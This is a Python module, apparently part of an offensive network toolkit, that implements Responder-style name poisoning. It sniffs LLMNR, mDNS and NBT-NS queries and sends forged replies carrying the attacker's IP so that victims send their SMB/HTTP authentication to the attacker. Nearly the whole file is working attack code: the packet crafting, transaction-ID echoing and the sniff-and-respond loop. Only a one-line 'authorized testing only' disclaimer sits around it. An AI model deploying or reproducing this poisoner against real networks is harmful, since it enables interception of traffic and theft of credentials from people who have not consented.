"""Name-service poisoning — answer LLMNR / mDNS / NBT-NS queries with our IP.

When a host can't resolve a name via DNS it falls back to broadcast/multicast
name lookups (LLMNR udp/5355, mDNS udp/5353, NBT-NS udp/137). Answering these
with our address (Responder-style) redirects the victim to us — classic for
capturing SMB/HTTP auth.

LLMNR and mDNS use the DNS wire format, so we detect and craft them as DNS by
port. We deliberately do NOT import scapy.layers.llmnr: importing it installs a
global catch-all UDP→DNS binding that would make the whole app mis-dissect other
UDP traffic. NBT-NS uses its own format, imported lazily only for port 137.

Response crafting is pure/testable; the listen+respond loop is integration.
For authorized testing only.
"""

from __future__ import annotations

import logging

log = logging.getLogger("reforge.namepoison")

_LLMNR_PORT = 5355
_MDNS_PORT = 5353
_NBNS_PORT = 137


def _dns_query_port(pkt):
    """If pkt is a DNS-format query on the LLMNR/mDNS port, return that port."""
    from scapy.layers.dns import DNS
    from scapy.layers.inet import UDP

    if not (pkt.haslayer(UDP) and pkt.haslayer(DNS)):
        return None
    if pkt[DNS].qr != 0:
        return None
    dport = int(pkt[UDP].dport)
    return dport if dport in (_LLMNR_PORT, _MDNS_PORT) else None


def queried_name(pkt) -> str | None:
    """Return the name a LLMNR/mDNS/NBT-NS query is asking for, or None."""
    if _dns_query_port(pkt) is not None:
        from scapy.layers.dns import DNS
        qd = _first(pkt[DNS].qd)
        name = getattr(qd, "qname", None)            # malformed question -> Raw, no qname
        if name:
            return _decode(name)

    if pkt.haslayer("UDP") and int(pkt["UDP"].dport) == _NBNS_PORT:
        try:
            from scapy.layers.netbios import NBNSQueryRequest
            if pkt.haslayer(NBNSQueryRequest):
                return _decode(pkt[NBNSQueryRequest].QUESTION_NAME)
        except Exception:
            pass
    return None


def build_response(pkt, our_ip: str):
    """Craft a poisoned response for a LLMNR/mDNS/NBT-NS query, or None."""
    from scapy.layers.inet import IP, UDP

    port = _dns_query_port(pkt)
    if port is not None:
        from scapy.layers.dns import DNS, DNSRR

        q = pkt[DNS]
        qd0 = _first(q.qd)
        if qd0 is None or not getattr(qd0, "qname", None):   # malformed question
            return None
        ttl = 30 if port == _LLMNR_PORT else 120
        return (IP(src=pkt[IP].dst, dst=pkt[IP].src)
                / UDP(sport=port, dport=pkt[UDP].sport)
                / DNS(id=q.id, qr=1, aa=1, qd=q.qd,
                      an=DNSRR(rrname=qd0.qname, type="A", ttl=ttl, rdata=our_ip)))

    if pkt.haslayer(UDP) and int(pkt[UDP].dport) == _NBNS_PORT:
        try:
            from scapy.layers.netbios import (
                NBNS_ADD_ENTRY,
                NBNSHeader,
                NBNSQueryRequest,
                NBNSQueryResponse,
            )
            if pkt.haslayer(NBNSQueryRequest):
                q = pkt[NBNSQueryRequest]
                # the transaction id lives on the NBNSHeader (a separate layer
                # in current scapy); echo it so the victim accepts the answer
                hdr = pkt.getlayer(NBNSHeader)
                trn = int(hdr.NAME_TRN_ID) if hdr is not None else 0
                return (IP(src=pkt[IP].dst, dst=pkt[IP].src)
                        / UDP(sport=_NBNS_PORT, dport=pkt[UDP].sport)
                        / NBNSHeader(NAME_TRN_ID=trn, RESPONSE=1, OPCODE=0,
                                     NM_FLAGS=0x1, ANCOUNT=1)
                        / NBNSQueryResponse(RR_NAME=q.QUESTION_NAME, SUFFIX=q.SUFFIX,
                                            ADDR_ENTRY=[NBNS_ADD_ENTRY(NB_ADDRESS=our_ip)]))
        except Exception:
            log.debug("NBT-NS response crafting failed", exc_info=True)
    return None


class NamePoisoner:  # pragma: no cover (needs root + live traffic)
    """Answer LLMNR/mDNS/NBT-NS queries on `iface` with `our_ip`."""

    def __init__(self, iface: str, our_ip: str):
        self.iface = iface
        self.our_ip = our_ip
        self._sniffer = None
        self.seen = 0        # LLMNR/mDNS/NBT-NS queries observed
        self.poisoned = 0    # queries we answered with our IP

    def _on(self, pkt):
        from scapy.sendrecv import send

        try:
            if queried_name(pkt) is None:
                return
            self.seen += 1
            resp = build_response(pkt, self.our_ip)
        except Exception:            # a hostile query must never kill the loop
            return
        if resp is not None:
            send(resp, iface=self.iface, verbose=False)
            self.poisoned += 1

    def status(self) -> dict:
        return {"running": self._sniffer is not None,
                "seen": self.seen, "poisoned": self.poisoned}

    def start(self) -> None:
        from scapy.sendrecv import AsyncSniffer

        self._sniffer = AsyncSniffer(iface=self.iface,
                                     filter="udp port 5355 or udp port 5353 or udp port 137",
                                     prn=self._on, store=False)
        self._sniffer.start()
        log.info("Name poisoner running on %s -> %s", self.iface, self.our_ip)

    def stop(self) -> None:
        if self._sniffer:
            self._sniffer.stop()
            self._sniffer = None


def _first(field):
    if field is None:
        return None
    try:
        return field[0] if len(field) else None
    except TypeError:
        return field


def _decode(name) -> str:
    if isinstance(name, bytes):
        return name.decode("latin-1", "replace").rstrip(".").strip()
    return str(name).rstrip(".").strip()
